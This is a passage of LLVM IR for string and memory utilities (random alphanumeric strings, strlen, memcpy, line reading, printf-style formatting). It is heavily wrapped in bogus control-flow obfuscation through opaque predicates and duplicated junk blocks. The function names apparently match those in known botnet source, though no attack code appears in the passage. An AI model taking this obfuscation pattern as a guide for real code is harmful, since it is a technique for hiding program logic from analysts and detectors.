  br i1 %109, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %21

; <label>:110:                                    ; preds = %21
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %111 = alloca i8*, align 8
  %112 = alloca i32, align 4
  store i8* %0, i8** %111, align 8
  store i32 %1, i32* %112, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %113 = load i32, i32* %12, align 4
  %114 = icmp sge i32 %113, 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %43
  %115 = call i32 @rand_next()
  %116 = load i8*, i8** %11, align 8
  %117 = bitcast i8* %116 to i32*
  store i32 %115, i32* %117, align 4
  %118 = load i8*, i8** %11, align 8
  %119 = getelementptr inbounds i8, i8* %118, i64 4
  store i8* %119, i8** %11, align 8
  %120 = load i32, i32* %12, align 4
  %121 = sext i32 %120 to i64
  %_ = sub i64 %121, 4
  %gen = mul i64 %_, 4
  %_7 = sub i64 0, %121
  %gen8 = add i64 %_7, 4
  %_9 = sub i64 %121, 4
  %gen10 = mul i64 %_9, 4
  %122 = sub i64 %121, 4
  %123 = trunc i64 %122 to i32
  store i32 %123, i32* %12, align 4
  br label %originalBB6

originalBB14alteredBB:                            ; preds = %originalBB14, %93
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %86, %2
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  br i1 %10, label %11, label %87

; <label>:11:                                     ; preds = %8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = icmp uge i64 %13, 4
  br i1 %14, label %15, label %77

; <label>:15:                                     ; preds = %11
  %16 = load i32, i32* @x.15
  %17 = load i32, i32* @y.16
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = call i32 @rand_next()
  store i32 %24, i32* %6, align 4
  store i32 0, i32* %5, align 4
  %25 = load i32, i32* @x.15
  %26 = load i32, i32* @y.16
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %69, %originalBBpart2
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = icmp ult i64 %35, 4
  br i1 %36, label %37, label %72

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.15
  %39 = load i32, i32* @y.16
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %6, align 4
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %7, align 1
  %49 = load i32, i32* %6, align 4
  %50 = lshr i32 %49, 8
  store i32 %50, i32* %6, align 4
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i32
  %53 = ashr i32 %52, 3
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %7, align 1
  %55 = load i8, i8* %7, align 1
  %56 = zext i8 %55 to i64
  %57 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i8*, i8** %3, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %3, align 8
  store i8 %58, i8* %59, align 1
  %61 = load i32, i32* @x.15
  %62 = load i32, i32* @y.16
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart222, label %originalBB1alteredBB

originalBBpart222:                                ; preds = %originalBB1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart222
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %5, align 4
  br label %33

; <label>:72:                                     ; preds = %33
  %73 = load i32, i32* %4, align 4
  %74 = sext i32 %73 to i64
  %75 = sub i64 %74, 4
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* %4, align 4
  br label %86

; <label>:77:                                     ; preds = %11
  %78 = call i32 @rand_next()
  %79 = zext i32 %78 to i64
  %80 = urem i64 %79, 32
  %81 = trunc i64 %80 to i8
  %82 = load i8*, i8** %3, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %3, align 8
  store i8 %81, i8* %82, align 1
  %84 = load i32, i32* %4, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %4, align 4
  br label %86

; <label>:86:                                     ; preds = %77, %72
  br label %8

; <label>:87:                                     ; preds = %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %15
  %88 = call i32 @rand_next()
  store i32 %88, i32* %6, align 4
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %89 = load i32, i32* %6, align 4
  %_ = shl i32 %89, 255
  %90 = and i32 %89, 255
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %7, align 1
  %92 = load i32, i32* %6, align 4
  %_2 = shl i32 %92, 8
  %_3 = shl i32 %92, 8
  %_4 = sub i32 %92, 8
  %gen = mul i32 %_4, 8
  %_5 = sub i32 0, %92
  %gen6 = add i32 %_5, 8
  %_7 = sub i32 %92, 8
  %gen8 = mul i32 %_7, 8
  %93 = lshr i32 %92, 8
  store i32 %93, i32* %6, align 4
  %94 = load i8, i8* %7, align 1
  %95 = zext i8 %94 to i32
  %_9 = sub i32 0, %95
  %gen10 = add i32 %_9, 3
  %_11 = sub i32 0, %95
  %gen12 = add i32 %_11, 3
  %_13 = sub i32 %95, 3
  %gen14 = mul i32 %_13, 3
  %_15 = sub i32 0, %95
  %gen16 = add i32 %_15, 3
  %_17 = sub i32 %95, 3
  %gen18 = mul i32 %_17, 3
  %_19 = sub i32 %95, 3
  %gen20 = mul i32 %_19, 3
  %96 = ashr i32 %95, 3
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %7, align 1
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i64
  %100 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %99
  %101 = load i8, i8* %100, align 1
  %102 = load i8*, i8** %3, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %3, align 8
  store i8 %101, i8* %102, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4

; <label>:13:                                     ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = load i32, i32* @x.19
  %5 = load i32, i32* @y.20
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  store i32 %2, i32* %14, align 4
  %17 = load i8*, i8** %12, align 8
  store i8* %17, i8** %15, align 8
  %18 = load i8*, i8** %13, align 8
  store i8* %18, i8** %16, align 8
  %19 = load i32, i32* @x.19
  %20 = load i32, i32* @y.20
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %originalBBpart24, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = add nsw i32 %28, -1
  store i32 %29, i32* %14, align 4
  %30 = icmp ne i32 %28, 0
  br i1 %30, label %31, label %53

; <label>:31:                                     ; preds = %27
  %32 = load i32, i32* @x.19
  %33 = load i32, i32* @y.20
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load i8*, i8** %16, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %16, align 8
  %42 = load i8, i8* %40, align 1
  %43 = load i8*, i8** %15, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %15, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* @x.19
  %46 = load i32, i32* @y.20
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %27

; <label>:53:                                     ; preds = %27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %54 = alloca i8*, align 8
  %55 = alloca i8*, align 8
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i8*, align 8
  store i8* %0, i8** %54, align 8
  store i8* %1, i8** %55, align 8
  store i32 %2, i32* %56, align 4
  %59 = load i8*, i8** %54, align 8
  store i8* %59, i8** %57, align 8
  %60 = load i8*, i8** %55, align 8
  store i8* %60, i8** %58, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %61 = load i8*, i8** %16, align 8
  %62 = getelementptr inbounds i8, i8* %61, i32 1
  store i8* %62, i8** %16, align 8
  %63 = load i8, i8* %61, align 1
  %64 = load i8*, i8** %15, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %15, align 8
  store i8 %63, i8* %64, align 1
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %originalBBpart2, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* @x.23
  %29 = load i32, i32* @y.24
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %6, align 4
  %37 = load i8*, i8** %4, align 8
  %38 = load i32, i32* %8, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = call i64 @read(i32 %36, i8* %40, i64 1)
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %7, align 4
  %43 = load i32, i32* %8, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* @x.23
  %46 = load i32, i32* @y.24
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %9

; <label>:53:                                     ; preds = %25
  %54 = load i32, i32* %7, align 4
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %73

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @x.23
  %58 = load i32, i32* @y.24
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %56
  %65 = load i32, i32* @x.23
  %66 = load i32, i32* @y.24
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %91

; <label>:73:                                     ; preds = %53
  %74 = load i32, i32* @x.23
  %75 = load i32, i32* @y.24
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %73
  %82 = load i8*, i8** %4, align 8
  %83 = load i32, i32* @x.23
  %84 = load i32, i32* @y.24
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %91

; <label>:91:                                     ; preds = %originalBBpart211, %originalBBpart27
  %92 = phi i8* [ null, %originalBBpart27 ], [ %82, %originalBBpart211 ]
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %27
  %93 = load i32, i32* %6, align 4
  %94 = load i8*, i8** %4, align 8
  %95 = load i32, i32* %8, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = call i64 @read(i32 %93, i8* %97, i64 1)
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %7, align 4
  %100 = load i32, i32* %8, align 4
  %_ = shl i32 %100, 1
  %_1 = sub i32 0, %100
  %gen = add i32 %_1, 1
  %_2 = sub i32 %100, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %100, 1
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %8, align 4
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %56
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %73
  %102 = load i8*, i8** %4, align 8
  br label %originalBB9
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %490, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %493

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %449

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %493

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %450

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %45 = load i32, i32* @x.27
  %46 = load i32, i32* @y.28
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.27
  %54 = load i32, i32* @y.28
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:61:                                     ; preds = %originalBBpart29, %originalBBpart2
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 48
  br i1 %65, label %66, label %87

; <label>:66:                                     ; preds = %61
  %67 = load i32, i32* @x.27
  %68 = load i32, i32* @y.28
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i8*, i8** %5, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %5, align 8
  %77 = load i32, i32* %8, align 4
  %78 = or i32 %77, 2
  store i32 %78, i32* %8, align 4
  %79 = load i32, i32* @x.27
  %80 = load i32, i32* @y.28
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %61

; <label>:87:                                     ; preds = %61
  br label %88

; <label>:88:                                     ; preds = %125, %87
  %89 = load i32, i32* @x.27
  %90 = load i32, i32* @y.28
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %88
  %97 = load i8*, i8** %5, align 8
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp sge i32 %99, 48
  %101 = load i32, i32* @x.27
  %102 = load i32, i32* @y.28
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %100, label %109, label %114

; <label>:109:                                    ; preds = %originalBBpart213
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp sle i32 %112, 57
  br label %114

; <label>:114:                                    ; preds = %109, %originalBBpart213
  %115 = phi i1 [ false, %originalBBpart213 ], [ %113, %109 ]
  br i1 %115, label %116, label %128

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* %7, align 4
  %118 = mul nsw i32 %117, 10
  store i32 %118, i32* %7, align 4
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = sub nsw i32 %121, 48
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, %122
  store i32 %124, i32* %7, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  %126 = load i8*, i8** %5, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %5, align 8
  br label %88

; <label>:128:                                    ; preds = %114
  %129 = load i32, i32* @x.27
  %130 = load i32, i32* @y.28
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %128
  %137 = load i8*, i8** %5, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 115
  %141 = load i32, i32* @x.27
  %142 = load i32, i32* @y.28
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %140, label %149, label %198

; <label>:149:                                    ; preds = %originalBBpart217
  %150 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %151 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = icmp ule i32 %152, 40
  br i1 %153, label %154, label %160

; <label>:154:                                    ; preds = %149
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 3
  %156 = load i8*, i8** %155, align 8
  %157 = getelementptr i8, i8* %156, i32 %152
  %158 = bitcast i8* %157 to i64*
  %159 = add i32 %152, 8
  store i32 %159, i32* %151, align 8
  br label %165

; <label>:160:                                    ; preds = %149
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %162 = load i8*, i8** %161, align 8
  %163 = bitcast i8* %162 to i64*
  %164 = getelementptr i8, i8* %162, i32 8
  store i8* %164, i8** %161, align 8
  br label %165

; <label>:165:                                    ; preds = %160, %154
  %166 = phi i64* [ %158, %154 ], [ %163, %160 ]
  %167 = load i32, i32* @x.27
  %168 = load i32, i32* @y.28
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %165
  %175 = load i64, i64* %166, align 8
  %176 = inttoptr i64 %175 to i8*
  store i8* %176, i8** %11, align 8
  %177 = load i8**, i8*** %4, align 8
  %178 = load i8*, i8** %11, align 8
  %179 = icmp ne i8* %178, null
  %180 = load i32, i32* @x.27
  %181 = load i32, i32* @y.28
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %179, label %188, label %190

; <label>:188:                                    ; preds = %originalBBpart221
  %189 = load i8*, i8** %11, align 8
  br label %191

; <label>:190:                                    ; preds = %originalBBpart221
  br label %191

; <label>:191:                                    ; preds = %190, %188
  %192 = phi i8* [ %189, %188 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.144, i32 0, i32 0), %190 ]
  %193 = load i32, i32* %7, align 4
  %194 = load i32, i32* %8, align 4
  %195 = call i32 @prints(i8** %177, i8* %192, i32 %193, i32 %194)
  %196 = load i32, i32* %9, align 4
  %197 = add nsw i32 %196, %195
  store i32 %197, i32* %9, align 4
  br label %490

; <label>:198:                                    ; preds = %originalBBpart217
  %199 = load i8*, i8** %5, align 8
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 100
  br i1 %202, label %203, label %228

; <label>:203:                                    ; preds = %198
  %204 = load i8**, i8*** %4, align 8
  %205 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %206 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 0
  %207 = load i32, i32* %206, align 8
  %208 = icmp ule i32 %207, 40
  br i1 %208, label %209, label %215

; <label>:209:                                    ; preds = %203
  %210 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 3
  %211 = load i8*, i8** %210, align 8
  %212 = getelementptr i8, i8* %211, i32 %207
  %213 = bitcast i8* %212 to i32*
  %214 = add i32 %207, 8
  store i32 %214, i32* %206, align 8
  br label %220

; <label>:215:                                    ; preds = %203
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 2
  %217 = load i8*, i8** %216, align 8
